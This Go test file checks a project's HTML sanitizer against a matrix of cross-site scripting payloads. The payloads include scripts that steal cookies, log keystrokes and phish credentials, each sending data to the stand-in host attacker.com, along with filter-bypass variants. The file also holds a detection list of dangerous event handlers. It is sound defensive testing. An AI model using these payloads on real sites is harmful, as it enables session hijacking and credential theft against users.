package sanitizer_test

import (
	"strings"
	"testing"

	"pidiekab/internal/platform/sanitizer"
)

// TestXSSSkillSecurityMatrix directly executes tests against all attack vectors
// and bypass techniques documented in .agents/skills/xss-html-injection-testing/SKILL.md.
func TestXSSSkillSecurityMatrix(t *testing.T) {
	matrix := []struct {
		vector      string
		description string
		payload     string
	}{
		// Phase 1 & 2: Stored & Basic Detection Testing Payloads
		{
			vector:      "Script Tag Injection",
			description: "Classic script tag execution",
			payload:     `<script>alert('XSS')</script>`,
		},
		{
			vector:      "Cookie Stealing Script",
			description: "Exfiltration of session cookie",
			payload:     `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`,
		},
		{
			vector:      "Keylogger Script",
			description: "Keylogger event injection",
			payload:     `<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}</script>`,
		},
		{
			vector:      "Session Hijacking Fetch",
			description: "Fetch API cookie and localStorage exfiltration",
			payload:     `<script>fetch('http://attacker.com/capture',{method:'POST',body:JSON.stringify({cookies:document.cookie})})</script>`,
		},
		{
			vector:      "Phishing Form Hijacking",
			description: "Fake login form injection for credential theft",
			payload:     `<div id="login"><h2>Session Expired</h2><form action="http://attacker.com/phish" method="POST"><input name="user"><input name="pass"><button>Login</button></form></div>`,
		},

		// Phase 3 & 4: Reflected & DOM-Sink Payloads
		{
			vector:      "Image Error Event Handler",
			description: "Inline onerror trigger on broken image",
			payload:     `<img src=x onerror=alert('XSS')>`,
		},
		{
			vector:      "SVG Onload Event Handler",
			description: "SVG onload trigger",
			payload:     `<svg onload=alert('XSS')>`,
		},
		{
			vector:      "Body Onload Event Handler",
			description: "Body onload trigger",
			payload:     `<body onload=alert('XSS')>`,
		},
		{
			vector:      "Attribute Breakout",
			description: "Closing attribute quotes to execute script",
			payload:     `"><script>alert(1)</script>`,
		},
		{
			vector:      "JavaScript URI in Anchor Href",
			description: "Direct javascript: URI execution",
			payload:     `<a href="javascript:alert(1)">Click here</a>`,
		},
		{
			vector:      "Data URI with HTML/JS Payload",
			description: "Base64 data URI execution",
			payload:     `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>`,
		},

		// Phase 5: HTML Injection Techniques
		{
			vector:      "CSS Exfiltration via Style Tag",
			description: "Style tag CSS injection for data mining",
			payload:     `<style>input[value^="a"]{background:url(http://attacker.com/a)}</style>`,
		},
		{
			vector:      "Iframe Phishing Overlay",
			description: "Iframe injection for UI redressing",
			payload:     `<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>`,
		},
		{
			vector:      "Marquee Defacement",
			description: "Marquee disruption injection",
			payload:     `<marquee>Important Security Notice: Your account is compromised!</marquee>`,
		},
		{
			vector:      "CSS Style Override",
			description: "Defacement via background color override",
			payload:     `<style>body{background:red !important;}</style>`,
		},

		// Phase 6: Filter Bypass Techniques
		{
			vector:      "Case Variation Script Tag",
			description: "Mixed case to evade lowercase-only regex",
			payload:     `<ScRiPt>alert(1)</sCrIpT>`,
		},
		{
			vector:      "Case Variation Image Handler",
			description: "Uppercase event handler to bypass filters",
			payload:     `<IMG SRC=x ONERROR=alert(1)>`,
		},
		{
			vector:      "Slash-Delimited SVG Onload",
			description: "Bypassing space filters with slashes",
			payload:     `<svg/onload=alert(1)>`,
		},
		{
			vector:      "Details Ontoggle Handler",
			description: "Details ontoggle event trigger",
			payload:     `<details/open/ontoggle=alert(1)>`,
		},
		{
			vector:      "Video/Audio Error Trigger",
			description: "Media error handler execution",
			payload:     `<video><source onerror=alert(1)></video>`,
		},
		{
			vector:      "Malformed Tag Delimiter",
			description: "Malformed double-quote bypass",
			payload:     `<img """><script>alert(1)</script>">`,
		},
		{
			vector:      "Newline Inside Event Handler",
			description: "Breaking event attribute name with newline/tab",
			payload:     "<img src=x\nonerror\n=alert(1)>",
		},
		{
			vector:      "Tab Inside Event Handler",
			description: "Tab insertion inside attribute separator",
			payload:     "<img src=x\tonerror\t=alert(1)>",
		},
		{
			vector:      "JavaScript Comment Bypass in Script Tag",
			description: "Inline comments within script tags",
			payload:     `<script>/**/alert(1)/**/</script>`,
		},
		{
			vector:      "Nested Script Tag Bypass",
			description: "Self-repairing script tag injection",
			payload:     `<scr<script>ipt>alert(1)</script>`,
		},
		{
			vector:      "Null Byte Tag Obfuscation",
			description: "Evading string filters using null byte",
			payload:     "<scr\x00ipt>alert(1)</script>",
		},
	}

	for _, tc := range matrix {
		t.Run(tc.vector, func(t *testing.T) {
			sanitized := sanitizer.SanitizeHTML(tc.payload)
			lowered := strings.ToLower(sanitized)

			// 1. Script tags must NEVER exist
			if strings.Contains(lowered, "<script") || strings.Contains(lowered, "</script") {
				t.Fatalf("[%s] sanitized HTML still contains script tags: %s", tc.vector, sanitized)
			}

			// 2. Inline event handlers must NEVER exist
			dangerousEvents := []string{"onload", "onerror", "onclick", "ontoggle", "onstart", "onkeypress", "onmouseover"}
			for _, evt := range dangerousEvents {
				if strings.Contains(lowered, evt+"=") || strings.Contains(lowered, evt+" =") {
					t.Fatalf("[%s] sanitized HTML still contains active event handler %q: %s", tc.vector, evt, sanitized)
				}
			}

			// 3. Dangerous protocols must NEVER exist in attributes
			if strings.Contains(lowered, "javascript:") || strings.Contains(lowered, "vbscript:") {
				t.Fatalf("[%s] sanitized HTML still contains script protocol: %s", tc.vector, sanitized)
			}

			// 4. Phishing forms, iframes, styles, marquees, svgs must NEVER survive
			forbidden := []string{"<form", "<iframe", "<style", "<marquee", "<svg"}
			for _, f := range forbidden {
				if strings.Contains(lowered, f) {
					t.Fatalf("[%s] sanitized HTML still contains forbidden element %q: %s", tc.vector, f, sanitized)
				}
			}
		})
	}
}
